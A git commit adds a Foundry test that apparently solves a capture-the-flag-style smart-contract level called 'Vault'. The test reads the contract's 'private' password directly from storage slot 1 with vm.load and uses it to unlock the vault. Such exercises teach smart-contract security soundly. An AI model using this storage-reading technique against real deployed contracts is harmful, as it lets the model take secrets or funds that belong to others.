e59d7bb5014c8cedd028faf2aa5f939ec89d9887
jeissoni <jeissoni_22@hotmail.com>
2023-09-18 16:41:28 -0500

    add vault level

---
+++ test/8_Vault/Vault.t.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+import "../../src/8_Vault/Vault.sol";
+
+contract VaultTest is Test {
+    Vault public victim;
+    bytes32 public password;
+
+    function setUp() public {
+        password = bytes32(
+            uint256(keccak256(abi.encodePacked(block.timestamp)))
+        );
+        victim = new Vault(password);
+    }
+
+    function testUnlock() public {
+        bytes32 passwordHack = vm.load(address(victim), bytes32(uint256(1)));
+
+        assertEq(passwordHack, password);
+
+        victim.unlock(passwordHack);
+
+        assertEq(victim.locked(), false);
+    }
+}
